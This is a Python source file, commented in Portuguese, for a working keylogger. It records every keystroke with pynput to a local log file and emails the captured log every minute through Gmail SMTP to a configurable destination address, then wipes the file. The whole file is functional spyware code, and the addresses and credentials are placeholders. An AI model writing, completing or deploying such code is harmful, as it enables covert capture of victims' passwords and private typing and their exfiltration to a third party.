import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Listener
import time
import threading

# --- Configurações de E-mail (ALTERE ESTES DADOS) ---
EMAIL_ADDRESS = "seu_email_de_teste@gmail.com"
EMAIL_PASSWORD = "sua_senha_de_app" # Use uma SENHA DE APLICATIVO, não a senha real!
TO_EMAIL_ADDRESS = "email_destino@exemplo.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
LOG_FILE = "log.txt"
INTERVALO_ENVIO_SEGUNDOS = 60 # Envia o log a cada 60 segundos (1 minuto)

# --- Funções do Keylogger ---

def on_press(key):
    """Callback chamado quando uma tecla é pressionada."""
    try:
        log_entry = str(key.char)
    except AttributeError:
        # Trata teclas especiais (e.g., Space, Enter)
        if key == key.space:
            log_entry = " "
        elif key == key.enter:
            log_entry = "\n[ENTER]\n"
        else:
            log_entry = f"[{str(key).split('.')[-1].upper()}]"
            
    with open(LOG_FILE, "a") as f:
        f.write(log_entry)

def send_log_email():
    """Lê o log, envia por e-mail e limpa o arquivo."""
    try:
        with open(LOG_FILE, "r") as f:
            log_content = f.read()
            
        if not log_content.strip():
            # Não envia se o log estiver vazio
            return
            
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = TO_EMAIL_ADDRESS
        msg['Subject'] = f"Keylog Capturado em {time.ctime()}"
        
        msg.attach(MIMEText(log_content, 'plain'))
        
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        text = msg.as_string()
        server.sendmail(EMAIL_ADDRESS, TO_EMAIL_ADDRESS, text)
        server.quit()
        
        # Limpa o log após o envio bem-sucedido
        open(LOG_FILE, "w").close() 
        print(f"Log enviado com sucesso para {TO_EMAIL_ADDRESS} e limpo.")
        
    except Exception as e:
        print(f"Erro ao enviar e-mail: {e}")

def schedule_email_sending():
    """Agenda a função de envio para rodar em loop."""
    send_log_email() # Envia imediatamente na primeira vez
    
    # Agenda a próxima execução
    threading.Timer(INTERVALO_ENVIO_SEGUNDOS, schedule_email_sending).start()

# --- Execução Principal ---

if __name__ == "__main__":
    print(f"Keylogger em execução... Capturando para {LOG_FILE}.")
    print(f"O log será enviado a cada {INTERVALO_ENVIO_SEGUNDOS} segundos.")
    
    # Inicia o agendamento de envio em uma thread separada
    schedule_email_sending()
    
    # Inicia o Listener para capturar as teclas
    with Listener(on_press=on_press) as listener:
        listener.join()